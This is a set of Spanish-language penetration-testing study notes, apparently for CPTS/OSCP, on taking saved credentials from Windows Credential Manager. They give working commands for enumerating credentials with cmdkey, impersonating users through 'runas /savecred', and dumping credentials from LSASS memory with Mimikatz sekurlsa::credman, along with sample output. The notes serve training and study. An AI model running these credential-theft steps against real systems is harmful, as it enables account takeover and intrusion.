
## 1. Windows Credential Manager

El **Administrador de Credenciales de Windows** permite almacenar credenciales para acceder a otros sistemas, servicios, recursos de red y sitios web.

Las credenciales se guardan cifradas en directorios asociados a los perfiles de usuario y del sistema.

### Ubicaciones importantes

```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

### Funcionamiento del cifrado

- Los archivos `Policy.vpol` contienen claves AES de 128 o 256 bits.
    
- Las claves AES están protegidas mediante **DPAPI** (_Data Protection API_).
    
- Las claves AES se utilizan para cifrar las credenciales almacenadas.
    
- Las versiones recientes de Windows pueden utilizar **Credential Guard**, que protege las claves maestras de DPAPI mediante seguridad basada en virtualización (VBS).
    

### Tipos de credenciales

|Tipo|Descripción|
|---|---|
|**Web Credentials**|Credenciales asociadas a sitios web y cuentas online. Utilizadas por Internet Explorer y versiones antiguas de Microsoft Edge.|
|**Windows Credentials**|Credenciales para servicios, cuentas de dominio, recursos de red y directorios compartidos.|
|**Generic Credentials**|Credenciales genéricas utilizadas por aplicaciones y servicios.|

### Abrir el administrador de credenciales

```
rundll32 keymgr.dll,KRShowKeyMgr
```

Permite visualizar y gestionar los nombres de usuario y las contraseñas almacenados.

Los almacenes también pueden exportarse mediante la interfaz de Windows a archivos `.crd`, protegidos con una contraseña proporcionada por el usuario.

## 2. Enumerar credenciales con `cmdkey`

El comando `cmdkey` permite enumerar las credenciales almacenadas en el perfil del usuario actual.

### Enumerar credenciales

```
whoami
cmdkey /list
```

Ejemplo de salida:

```
Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles
```

### Interpretar la salida

|Campo|Descripción|
|---|---|
|`Target`|Recurso o cuenta a la que pertenece la credencial.|
|`Type`|Tipo de credencial almacenada.|
|`User`|Usuario asociado a la credencial.|
|`Persistence`|Indica si la credencial se almacena de forma persistente.|

**Importante:** las credenciales con `Local machine persistence` pueden sobrevivir a los reinicios.

Algunas entradas, como `virtualapp/didlogical`, corresponden a identificadores internos de servicios de Microsoft y pueden no resultar útiles durante la enumeración.

### Aprovechar credenciales almacenadas con `runas`

Si encontramos una credencial de dominio del tipo `Domain Password` asociada a un inicio de sesión interactivo, podemos intentar ejecutar un proceso con la identidad del usuario almacenado.

```
runas /savecred /user:SRV01\mcharles cmd
```

Comprobar la identidad en la nueva consola:

```
whoami
```

Si funciona, la consola se ejecutará como:

```
srv01\mcharles
```

**Punto clave:** `runas /savecred` permite utilizar credenciales guardadas para ejecutar procesos con otra identidad, siempre que las condiciones y los permisos del sistema lo permitan.

## 3. Extraer credenciales con Mimikatz

**Mimikatz** permite extraer material de autenticación almacenado en memoria y trabajar con credenciales protegidas por DPAPI.

Una de las técnicas disponibles consiste en utilizar el módulo `sekurlsa` para extraer información del proceso LSASS.

### Paso 1. Ejecutar Mimikatz

```
mimikatz.exe
```

### Paso 2. Habilitar el privilegio de depuración

```
privilege::debug
```

### Paso 3. Extraer credenciales del Credential Manager

```
sekurlsa::credman
```

El comando puede mostrar información como:

```
Authentication Id : 0 ; 630472
Session           : RemoteInteractive
User Name         : mcharles
Domain            : SRV01

credman:
    Username : mcharles@inlanefreight.local
    Domain   : onedrive.live.com
    Password : ...
```

### Información que podemos obtener

- **User Name:** nombre de usuario asociado a la credencial.
    
- **Domain:** dominio o servicio al que pertenece.
    
- **Password:** contraseña almacenada, si está disponible y puede recuperarse.
    
- **Authentication Id:** identificador de la sesión de autenticación.
    
- **Session:** tipo de sesión del usuario.
    

**Importante:** la extracción puede requerir privilegios elevados y no todas las credenciales estarán disponibles en texto claro.

Además de Mimikatz, existen herramientas para enumerar y recuperar credenciales almacenadas:

|Herramienta|Utilidad|
|---|---|
|**Mimikatz**|Extraer credenciales de memoria y utilizar módulos relacionados con DPAPI.|

|**LaZagne**|Buscar credenciales almacenadas por aplicaciones y servicios.|
|**DonPAPI**|Recuperar y analizar credenciales protegidas mediante DPAPI en entornos Windows.|

## 5. Metodología práctica para el examen

Cuando tengamos acceso a un sistema Windows, podemos seguir este orden:

### Paso 1. Identificar el usuario actual

```
whoami
```

### Paso 2. Enumerar las credenciales guardadas

```
cmdkey /list
```

### Paso 3. Identificar cuentas interesantes

Buscar especialmente:

- Credenciales de dominio.
    
- Cuentas de otros usuarios.
    
- Credenciales asociadas a servicios.
    
- Entradas persistentes que puedan sobrevivir a los reinicios.
    

### Paso 4. Probar las credenciales almacenadas

Si encontramos una credencial apropiada, podemos intentar ejecutar una consola con esa identidad:

```
runas /savecred /user:DOMINIO\usuario cmd
```

Verificar el resultado:

```
whoami
```

### Paso 5. Investigar las credenciales protegidas

Si disponemos de los privilegios necesarios, podemos utilizar Mimikatz:

```
privilege::debug
sekurlsa::credman
```

Si necesitamos investigar los almacenes cifrados y DPAPI, podemos recurrir a herramientas como SharpDPAPI.

## 7. Puntos clave para CPTS/OSCP

- **Credential Manager** almacena credenciales que pueden permitir acceder a otros servicios o cuentas.
    
- `cmdkey /list` es uno de los primeros comandos que debemos ejecutar al buscar credenciales guardadas.
    
- Una entrada `Domain Password` puede revelar una cuenta de dominio interesante.
    
- `runas /savecred` permite aprovechar credenciales guardadas para ejecutar procesos con otra identidad, si se cumplen los requisitos.
    
- Mimikatz utiliza `sekurlsa::credman` para investigar credenciales del Credential Manager presentes en memoria.
    
- **DPAPI** protege datos y claves; encontrar archivos del almacén no significa que podamos descifrarlos automáticamente.
    
- **Credential Guard** puede dificultar la recuperación de determinadas credenciales y claves.
    
- Encontrar una credencial no garantiza que siga siendo válida ni que tenga privilegios suficientes.
